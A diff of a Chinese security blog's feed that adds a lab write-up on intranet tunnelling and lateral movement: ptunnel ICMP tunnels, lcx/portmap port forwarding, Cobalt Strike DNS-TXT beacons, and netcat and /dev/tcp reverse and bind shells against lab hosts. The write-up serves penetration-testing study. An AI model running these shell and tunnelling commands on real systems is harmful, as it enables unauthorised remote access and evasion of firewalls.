-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328144156493.png" alt="image-20220328144156493"></p>
-<p>interact进去后，输入如下命令进行配置</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line"><span class="selector-attr">[*]</span> Tasked beacon <span class="selector-tag">to</span> checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line"><span class="selector-attr">[+]</span> data channel set <span class="selector-tag">to</span> DNS-TXT</span><br><span class="line"><span class="selector-attr">[+]</span> host called home, sent: <span class="number">8</span> bytes</span><br></pre></td></tr></table></figure>
-
-<p>出现如下图的样子，就说明受害主机真正成功上线</p>
-<p>接下来就可以执行命令了</p>
-<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220328145736619.png" alt="image-20220328145736619"></p>
-<p>这里还遇到另外一个坑，就是当时弄的时候用的学校的网络，导致输入命令没有回显，换了手机热点就行了，真的吐了🤮</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/weixin_28744573/article/details/116581837">关闭linux系统的53端口</a></p>
-<p><a href="https://blog.csdn.net/qq_43645782/article/details/121416056">Linux systemd-resolve占用53端口的解决方法</a></p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">portmap+lcx.exe下载</a></p>
 ]]></content>
       <categories>
         <category>内网安全</category>
@@ -2513,68 +2357,168 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>基础入门</title>
-    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<p>基础入门</p>
-<span id="more"></span>
-<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
-<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
-<p>操作系统：windows、linux</p>
-<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
-<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
-<p>​    </p>
-<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
-<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
-<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
-<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%851.jpg" alt="数据包1"></p>
-<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
-<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%852.JPG" alt="数据包2"></p>
-<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
-<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
-<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
-<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
-<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
-<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
-<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
-<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
-<p>2xx    成功，行为被成功地执行</p>
-<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
-<p>4xx    客户端错误</p>
-<p>5xx    服务端错误</p>
-<p>200    存在文件</p>
-<p>403    存在文件夹</p>
-<p>3xx    均可能存在</p>
-<p>404    不存在文件及文件夹</p>
-<p>500    均可能存在</p>
-<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
-<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
-<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
-<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
-<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
-<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
-<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
-<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
-<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
-<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
-<p>php+mysql</p>
-<p>aspx+mssql</p>
-<p>jsp+mssql,oracle</p>
-<p>python+mongodb</p>
-<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
-<p>oracle    1521</p>
-<p>sqlsever    1433</p>
-<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
-<p>搜索特定关键字加密字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>
+    <title>域横向网络&amp;传输&amp;应用层隧道技术</title>
+    <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220314130404064.png" alt="image-20220314130404064"></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
+<h3 id="代理和隧道技术的区别"><a href="#代理和隧道技术的区别" class="headerlink" title="代理和隧道技术的区别"></a>代理和隧道技术的区别</h3><p>代理主要解决网络访问通讯问题（从一个内网到另一个内网）</p>
+<p>隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等</p>
+<h3 id="隧道技术解决什么"><a href="#隧道技术解决什么" class="headerlink" title="隧道技术解决什么"></a>隧道技术解决什么</h3><p>用单独的通道来传输被拦截的数据</p>
+<p>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</p>
+<h3 id="常见的隧道技术"><a href="#常见的隧道技术" class="headerlink" title="常见的隧道技术"></a>常见的隧道技术</h3><p>网络层：IPv6隧道、ICMP隧道</p>
+<p>传输层：TCP隧道、UDP隧道、常规端口转发</p>
+<p>应用层：SSH隧道、HTTP/S隧道、DNS隧道</p>
+<h2 id="网络传输应用层检测连通性-检测"><a href="#网络传输应用层检测连通性-检测" class="headerlink" title="网络传输应用层检测连通性-检测"></a>网络传输应用层检测连通性-检测</h2><h3 id="1-TCP协议"><a href="#1-TCP协议" class="headerlink" title="1.TCP协议"></a>1.TCP协议</h3><p>用“瑞士军刀”netcat，执行nc命令：</p>
+<pre><code>nc &lt;IP&gt; &lt;端口&gt;
+</code></pre>
+<h3 id="2-HTTP协议"><a href="#2-HTTP协议" class="headerlink" title="2.HTTP协议"></a>2.HTTP协议</h3><p>用curl工具，执行：</p>
+<pre><code>curl &lt;IP地址:端口&gt;
+</code></pre>
+<p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
+<h3 id="3-ICMP协议"><a href="#3-ICMP协议" class="headerlink" title="3.ICMP协议"></a>3.ICMP协议</h3><p>用ping命令，执行：</p>
+<pre><code>ping &lt;IP地址/域名&gt;
+</code></pre>
+<h3 id="4-DNS协议"><a href="#4-DNS协议" class="headerlink" title="4.DNS协议"></a>4.DNS协议</h3><p>检测DNS连通性常用的命令是nslookup和dig</p>
+<p>nslookup是windows自带的DNS探测命令</p>
+<p>dig是linux系统自带的DNS探测命令</p>
+<h2 id="网络ICMP隧道Ptunnel使用-检测，利用"><a href="#网络ICMP隧道Ptunnel使用-检测，利用" class="headerlink" title="网络ICMP隧道Ptunnel使用-检测，利用"></a>网络ICMP隧道Ptunnel使用-检测，利用</h2><p>ptunnel把tcp/udp/sock5流量伪装成icmp流量进行转发</p>
+<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">p <span class="comment">##表示链接icmp隧道另一端的机器IP（目标服务器）</span></span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">lp     表示需要监听的本地tcp端口</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">da <span class="comment">##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">dp <span class="comment">##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span></span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line">-<span class="ruby">x <span class="comment">##设置连接的密码</span></span></span><br></pre></td></tr></table></figure>
 
+<h3 id="ptunnel安装"><a href="#ptunnel安装" class="headerlink" title="ptunnel安装"></a>ptunnel安装</h3><p><a href="https://www.cnblogs.com/autopwn/p/14642658.html">https://www.cnblogs.com/autopwn/p/14642658.html</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Centos7下的安装步骤</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap的依赖环境</span></span><br><span class="line">yum -y install byacc</span><br><span class="line">yum -y install flex bison</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装PingTunnel</span></span><br><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line">cd PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">安装完成之后直接可以执行命令</span><br></pre></td></tr></table></figure>
 
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220316001809150.png" alt="image-20220316001809150"></p>
+<p>攻击机kali：192.168.184.128</p>
+<p>中介机webserver：192.168.184.142(可出网)   192.168.22.128(内网)</p>
+<p>目标机DC(windows)：192.168.22.130(内网)</p>
+<h4 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h4><p>中介机开启隧道，密码为123</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322130944392.png" alt="image-20220322130944392"></p>
+<p>攻击机连接隧道</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ptunnel</span> -p <span class="number">192.168.184.142</span> -lp <span class="number">2333</span> -da <span class="number">192.168.22.130</span> -dp <span class="number">3389</span> -x <span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131219962.png" alt="image-20220322131219962"></p>
+<p>当192.168.184.142（p）收到来自192.168.22.130（da）的3389端口（dp）的数据时，发送到攻击机的1080端口（lp）。反之亦然（在二者之间建立隧道）</p>
+<p>攻击机(kali)使用<code>rdesktop</code>进行远程连接</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rdesktop</span> <span class="number">127.0.0.1</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131505617.png" alt="image-20220322131505617"></p>
+<p>输入用户名密码登录成功</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220322131717154.png" alt="image-20220322131717154"></p>
+<h2 id="传输层转发隧道lcx、Portmap使用-检测利用"><a href="#传输层转发隧道lcx、Portmap使用-检测利用" class="headerlink" title="传输层转发隧道lcx、Portmap使用-检测利用"></a>传输层转发隧道lcx、Portmap使用-检测利用</h2><p>Windows：lcx</p>
+<p>Linux：portmap</p>
+<h4 id="windows演示"><a href="#windows演示" class="headerlink" title="windows演示"></a>windows演示</h4><h5 id="在被攻击机上："><a href="#在被攻击机上：" class="headerlink" title="在被攻击机上："></a>在被攻击机上：</h5><pre><code>lcx -slave 跳板机IP 6666 127.0.0.1 3389
+</code></pre>
+<p>将（被攻击机）本地的3389转发到跳板机的6666端口</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090734071.png" alt="image-20220323090734071"></p>
+<h5 id="在跳板机上（这里需要在跳板机监听才能接收到数据）："><a href="#在跳板机上（这里需要在跳板机监听才能接收到数据）：" class="headerlink" title="在跳板机上（这里需要在跳板机监听才能接收到数据）："></a>在跳板机上（<strong>这里需要在跳板机监听才能接收到数据</strong>）：</h5><pre><code>lcx -listen 本机端口 映射端口
+
+lcx -listen 6666 7777
+</code></pre>
+<p>监听6666映射到7777</p>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323090627017.png" alt="image-20220323090627017"></p>
+<h5 id="在攻击机上（进行远程连接）："><a href="#在攻击机上（进行远程连接）：" class="headerlink" title="在攻击机上（进行远程连接）："></a>在攻击机上（进行远程连接）：</h5><pre><code>rdesktop 跳板机IP:7777
+</code></pre>
+<h2 id="传输层转发隧道Netcat使用-检测，利用，功能"><a href="#传输层转发隧道Netcat使用-检测，利用，功能" class="headerlink" title="传输层转发隧道Netcat使用-检测，利用，功能"></a>传输层转发隧道Netcat使用-检测，利用，功能</h2><h3 id="1-双向连接反弹shell"><a href="#1-双向连接反弹shell" class="headerlink" title="1.双向连接反弹shell"></a>1.双向连接反弹shell</h3><h4 id="正向：攻击连接受害"><a href="#正向：攻击连接受害" class="headerlink" title="正向：攻击连接受害"></a>正向：攻击连接受害</h4><p><strong>受害：</strong></p>
+<pre><code>nc -ldp 1234 -e /bin/sh                                          //linux
+
+nc -ldp 1234 -e c:\windows\system32\cmd.exe    //windows
+</code></pre>
+<p>将命令行界面（shell/cmd）推到1234端</p>
+<p><strong>攻击：</strong></p>
+<pre><code>nc 受害机IP 1234                                          //主动连接
+</code></pre>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120426682.png" alt="image-20220323120426682"></p>
+<h4 id="反向：受害连接攻击"><a href="#反向：受害连接攻击" class="headerlink" title="反向：受害连接攻击"></a>反向：受害连接攻击</h4><p><strong>攻击：</strong></p>
+<p>监听自己的1234端口</p>
+<pre><code>nc -lvp 1234
+</code></pre>
+<p><strong>受害：</strong></p>
+<pre><code>nc 攻击机IP 1234 -e /bin/sh
+
+nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
+</code></pre>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220323120156763.png" alt="image-20220323120156763"></p>
+<h3 id="2-多向连接反弹shell-配合转发-反向-portmap"><a href="#2-多向连接反弹shell-配合转发-反向-portmap" class="headerlink" title="2.多向连接反弹shell-配合转发-反向-portmap"></a>2.多向连接反弹shell-配合转发-<strong>反向</strong>-<strong>portmap</strong></h3><blockquote>
+<p>Target2服务器将自己的cmd反弹到Target1的666端口，Target1使用portmap将本地666端口映射到本地777端口，最后由kali(攻击机)连接Target1的777端口</p>
+</blockquote>
+<h4 id="Target2-Ubuntu"><a href="#Target2-Ubuntu" class="headerlink" title="Target2_Ubuntu"></a>Target2_Ubuntu</h4><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.22.128/6666 &lt;&amp;1
+</code></pre>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190611981.png" alt="image-20220327190611981"></p>
+<h4 id="Target1-CentOS"><a href="#Target1-CentOS" class="headerlink" title="Target1_CentOS"></a>Target1_CentOS</h4><p>把666端口数据转发到777端口</p>
+<pre><code>./portmap -m 1 -p1 6666 -h2 192.168.184.128 -p2 7777
+</code></pre>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190552222.png" alt="image-20220327190552222"></p>
+<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><pre><code>nc -lvvp 7777
+</code></pre>
+<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220327190529559.png" alt="image-20220327190529559"></p>
+<h4 id="portmap使用"><a href="#portmap使用" class="headerlink" title="portmap使用"></a>portmap使用</h4><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">Usage:./portmap -m <span class="function"><span class="keyword">method</span> [-<span class="title">h1</span> <span class="title">host1</span>] -<span class="title">p1</span> <span class="title">port1</span> [-<span class="title">h2</span> <span class="title">host2</span>] -<span class="title">p2</span> <span class="title">port2</span> [-<span class="title">v</span>] [-<span class="title">log</span> <span class="title">filename</span>]</span></span><br><span class="line"><span class="function"> -<span class="title">v</span>:</span> version</span><br><span class="line"> -h1: host1</span><br><span class="line"> -h2: host2</span><br><span class="line"> -p1: port1</span><br><span class="line"> -p2: port2</span><br><span class="line"> -log: log the data</span><br><span class="line"> -m: the action <span class="function"><span class="keyword">method</span> <span class="title">for</span> <span class="title">this</span> <span class="title">tool</span></span></span><br><span class="line"><span class="function"> 1:</span> listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> connect <span class="keyword">to</span> HOST2:PORT2</span><br><span class="line"> <span class="number">2</span>: listen <span class="keyword">on</span> PORT1 <span class="keyword">and</span> PORT2</span><br><span class="line"> <span class="number">3</span>: connect <span class="keyword">to</span> HOST1:PORT1 <span class="keyword">and</span> HOST2:PORT2</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/LTtiandd/article/details/102903725">https://blog.csdn.net/LTtiandd/article/details/102903725</a></p>
+<h3 id="3-相关netcat主要功能"><a href="#3-相关netcat主要功能" class="headerlink" title="3.相关netcat主要功能"></a>3.相关netcat主要功能</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指纹服务</span></span><br><span class="line">nc -nv 192.168.184.142:xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line">nc -v -z 192.168.184.142 1-100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口监听</span></span><br><span class="line">nc -lvp xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件传输</span></span><br><span class="line">nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹Shell（见上）</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="应用层DNS隧道配合CS上线-检测，利用，说明"><a href="#应用层DNS隧道配合CS上线-检测，利用，说明" class="headerlink" title="应用层DNS隧道配合CS上线-检测，利用，说明"></a>应用层DNS隧道配合CS上线-检测，利用，说明</h2><blockquote>
+<p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p>
+</blockquote>
